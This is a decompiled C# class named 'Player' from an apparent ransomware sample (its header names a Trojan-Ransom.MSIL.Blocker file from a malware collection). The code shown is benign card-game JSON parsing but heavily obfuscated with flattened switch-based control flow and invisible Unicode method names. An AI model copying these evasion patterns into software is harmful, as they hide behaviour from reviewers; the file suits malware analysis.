// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: AdjustmentRu, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 295D2DB0-E85F-4EE4-A4D8-BB22DC4EE57D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-56431be0898e907a3b97e42a4c9d74cbdb487ed8617dcf64fb3a8dddef6dded1.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -229063867;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2108893917)) % 11U)
        {
          case 0:
            str1 = "5665727369";
            num1 = (int) num2 * 1247191175 ^ -541441965;
            continue;
          case 1:
            int num3 = BaseStream == 0 ? -367913238 : (num3 = -1780983595);
            num1 = num3 ^ (int) num2 * -1062054889;
            continue;
          case 2:
            num1 = (int) num2 * -2000916817 ^ -1502890825;
            continue;
          case 3:
            flag = BaseStream == 1;
            num1 = -1403654120;
            continue;
          case 5:
            goto label_1;
          case 6:
            str1 = (string) null;
            num1 = (int) num2 * -1360971565 ^ 535321673;
            continue;
          case 7:
            str1 = "38685975";
            num1 = (int) num2 * -282345656 ^ -285040096;
            continue;
          case 8:
            num1 = (int) num2 * -2101929789 ^ 1246736085;
            continue;
          case 9:
            int num4 = !flag ? 1890230651 : (num4 = 655360296);
            num1 = num4 ^ (int) num2 * -1388004383;
            continue;
          case 10:
            str2 = str1;
            num1 = -856046396;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1651046093;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1999082412)) % 4U)
        {
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 1346751069 ^ 756622642;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 845773242;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
        int index = 0;
label_1:
        int num2 = -1435409461;
        int num3;
        int planningCardsCount;
        bool flag;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -553685635)) % 13U)
          {
            case 0:
              flag = num3 > 0;
              num2 = (int) num4 * -1619637948 ^ 472903256;
              continue;
            case 1:
              num2 = (int) num4 * -538067794 ^ 494287647;
              continue;
            case 2:
              int num5 = !flag ? -1824824371 : (num5 = -330703612);
              num2 = num5 ^ (int) num4 * -978691855;
              continue;
            case 3:
              num3 = planningCards[index];
              num2 = -570048278;
              continue;
            case 5:
              num2 = (int) num4 * -1962418883 ^ 2083761432;
              continue;
            case 6:
              planningCardsCount = num1;
              num2 = (int) num4 * -1833717874 ^ 1332338214;
              continue;
            case 7:
              goto label_1;
            case 8:
              int num6;
              num2 = num6 = index >= planningCards.Length ? -385554288 : (num6 = -528509395);
              continue;
            case 9:
              num2 = -273123999;
              continue;
            case 10:
              ++num1;
              num2 = (int) num4 * 1721567934 ^ 2053952176;
              continue;
            case 11:
              num2 = (int) num4 * -1211043816 ^ -1775329219;
              continue;
            case 12:
              ++index;
              num2 = (int) num4 * 877951236 ^ 621063734;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -1621033415;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -64758194)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 2056201051 ^ -158004525;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -1999754499;
      int index;
      string str1;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -776375039)) % 13U)
        {
          case 0:
            num1 = (int) num2 * -1709011744 ^ 564627281;
            continue;
          case 1:
            str1 = Player.\u202C‮⁮⁫⁯⁪⁪⁫⁫‪⁮‍‏​⁫‏⁪‍⁪⁮⁪‪‎​‭⁪‬⁭⁪‪⁯⁬‭​​‏‎‬‭⁫‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1068375297;
            continue;
          case 2:
            ++index;
            num1 = -576617164;
            continue;
          case 3:
            index = 0;
            num1 = (int) num2 * -998496073 ^ 1466547681;
            continue;
          case 4:
            str2 = str1;
            num1 = (int) num2 * 850675157 ^ 694128891;
            continue;
          case 5:
            goto label_1;
          case 6:
            str1 = " ";
            num1 = (int) num2 * -714136972 ^ 1761027554;
            continue;
          case 7:
            num1 = -763197863;
            continue;
          case 8:
            num1 = (int) num2 * -634005382 ^ -329840054;
            continue;
          case 9:
            int num3;
            num1 = num3 = index < this.PlanningCards.Length ? -1063090882 : (num3 = -80142890);
            continue;
          case 11:
            planningCard = this.PlanningCards[index];
            int num4 = planningCard != 0 ? -352546845 : (num4 = -1112197156);
            num1 = num4 ^ (int) num2 * -336090481;
            continue;
          case 12:
            num1 = (int) num2 * 561709743 ^ 2093430675;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1327733618;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1321735297)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -664515239 ^ -315876496;
            continue;
          case 2:
            num1 = (int) num2 * 695535765 ^ 1462617882;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 389816886;
      int count;
      int[] numArray;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 605624518)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 1880168960;
            continue;
          case 2:
            num1 = (int) num2 * -1723977143 ^ -602748338;
            continue;
          case 4:
            int num3;
            num1 = num3 = aIndex < count ? 2039912649 : (num3 = 413885593);
            continue;
          case 5:
            aIndex = 0;
            num1 = (int) num2 * 1822866344 ^ -367577200;
            continue;
          case 6:
            num1 = (int) num2 * -1342952454 ^ -59015358;
            continue;
          case 7:
            planningCards = numArray;
            num1 = (int) num2 * 80957806 ^ -1210542485;
            continue;
          case 8:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * 48079630 ^ 1050679307;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1845904117;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2077377248)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Player.\u202B‫‮‎‮⁪⁪‮⁯⁬⁪⁯‫‮⁪‎‌⁭⁫⁮‭‭‍‫⁫⁭‏‭‍⁪‏⁫‌‎‭‪⁭‪‮‫‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 359960605 ^ 476332736;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u202C‮⁮⁫⁯⁪⁪⁫⁫‪⁮‍‏​⁫‏⁪‍⁪⁮⁪‪‎​‭⁪‬⁭⁪‪⁯⁬‭​​‏‎‬‭⁫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202B‫‮‎‮⁪⁪‮⁯⁬⁪⁯‫‮⁪‎‌⁭⁫⁮‭‭‍‫⁫⁭‏‭‍⁪‏⁫‌‎‭‪⁭‪‮‫‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
